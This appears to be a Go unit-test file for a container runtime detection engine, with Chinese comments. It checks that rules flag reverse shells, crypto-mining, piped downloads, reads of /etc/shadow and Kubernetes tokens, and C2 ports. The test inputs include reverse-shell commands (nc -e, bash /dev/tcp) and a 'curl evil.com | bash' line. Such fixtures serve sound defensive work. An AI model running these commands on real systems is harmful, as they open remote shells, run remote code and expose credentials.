package rules

import (
	"net"
	"testing"
)

func TestMatchExecve_BlockedProcess(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	// 测试黑名单进程匹配
	result := engine.MatchExecve("nc", "-e /bin/bash 10.0.0.1 4444", "nc")
	if result == nil {
		t.Fatal("应匹配 reverse-shell-detected 规则，但返回 nil")
	}
	if result.RuleName != "reverse-shell-detected" {
		t.Fatalf("期望规则名 reverse-shell-detected，实际 %s", result.RuleName)
	}
	if result.Severity != "critical" {
		t.Fatalf("期望严重等级 critical，实际 %s", result.Severity)
	}
}

func TestMatchExecve_BlockedArgs(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	// 测试黑名单参数匹配
	result := engine.MatchExecve("bash", "bash -c '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", "bash")
	if result == nil {
		t.Fatal("应匹配 reverse-shell-detected 规则（/dev/tcp/ 参数），但返回 nil")
	}
}

func TestMatchExecve_CryptoMining(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	result := engine.MatchExecve("xmrig", "-o pool.mine.xyz:3333", "xmrig")
	if result == nil {
		t.Fatal("应匹配 crypto-mining 规则，但返回 nil")
	}
	if result.RuleName != "crypto-mining" {
		t.Fatalf("期望规则名 crypto-mining，实际 %s", result.RuleName)
	}
}

func TestMatchExecve_SuspiciousDownload(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	result := engine.MatchExecve("curl", "curl http://evil.com/malware.sh | bash", "curl")
	if result == nil {
		t.Fatal("应匹配 suspicious-download 规则，但返回 nil")
	}
}

func TestMatchExecve_NormalProcess(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	// 正常进程不应匹配
	result := engine.MatchExecve("ls", "-la /tmp", "ls")
	if result != nil {
		t.Fatalf("正常进程不应匹配规则，但匹配了 %s", result.RuleName)
	}
}

func TestMatchOpen_SensitivePath(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	result := engine.MatchOpen("/etc/shadow", "cat")
	if result == nil {
		t.Fatal("应匹配 sensitive-file-access 规则，但返回 nil")
	}
	if result.RuleName != "sensitive-file-access" {
		t.Fatalf("期望规则名 sensitive-file-access，实际 %s", result.RuleName)
	}
}

func TestMatchOpen_K8sSecret(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	result := engine.MatchOpen("/var/run/secrets/kubernetes.io/serviceaccount/token", "cat")
	if result == nil {
		t.Fatal("应匹配 K8s Secret 路径，但返回 nil")
	}
}

func TestMatchOpen_NormalPath(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	result := engine.MatchOpen("/etc/hosts", "cat")
	if result != nil {
		t.Fatalf("正常路径不应匹配规则，但匹配了 %s", result.RuleName)
	}
}

func TestMatchOpen_ExcludeProcess(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	// kubevigil 进程应被排除
	result := engine.MatchOpen("/etc/shadow", "kubevigil")
	if result != nil {
		t.Fatal("kubevigil 进程应被排除，但匹配了规则")
	}
}

func TestMatchConnect_BlockedPort(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	ip := net.ParseIP("1.2.3.4")
	result := engine.MatchConnect(ip, 4444, "unknown")
	if result == nil {
		t.Fatal("应匹配 c2-communication 规则（端口 4444），但返回 nil")
	}
}

func TestMatchConnect_BlockedCIDR(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	ip := net.ParseIP("203.0.113.50")
	result := engine.MatchConnect(ip, 80, "unknown")
	if result == nil {
		t.Fatal("应匹配 c2-communication 规则（CIDR），但返回 nil")
	}
}

func TestMatchConnect_NormalConnection(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	ip := net.ParseIP("8.8.8.8")
	result := engine.MatchConnect(ip, 443, "curl")
	if result != nil {
		t.Fatalf("正常连接不应匹配规则，但匹配了 %s", result.RuleName)
	}
}

func TestMatchProcess_Basename(t *testing.T) {
	tests := []struct {
		filename string
		pattern  string
		expected bool
	}{
		{"/usr/bin/nc", "nc", true},
		{"nc", "nc", true},
		{"/usr/bin/ls", "nc", false},
		{"/usr/local/bin/xmrig", "xmrig", true},
	}

	for _, tt := range tests {
		result := matchProcess(tt.filename, tt.pattern)
		if result != tt.expected {
			t.Errorf("matchProcess(%q, %q) = %v, expected %v", tt.filename, tt.pattern, result, tt.expected)
		}
	}
}

func TestGetRuleCount(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	count := engine.GetRuleCount()
	if count != 5 {
		t.Fatalf("期望 5 条默认规则，实际 %d", count)
	}
}

func TestReloadRules(t *testing.T) {
	engine := NewEngine()
	engine.LoadDefaultRules()

	// 重载默认规则文件应成功
	err := engine.ReloadRules("../../configs/rules.yaml")
	if err != nil {
		t.Fatalf("重载规则失败: %v", err)
	}

	count := engine.GetRuleCount()
	if count == 0 {
		t.Fatal("重载后规则数量不应为 0")
	}
}
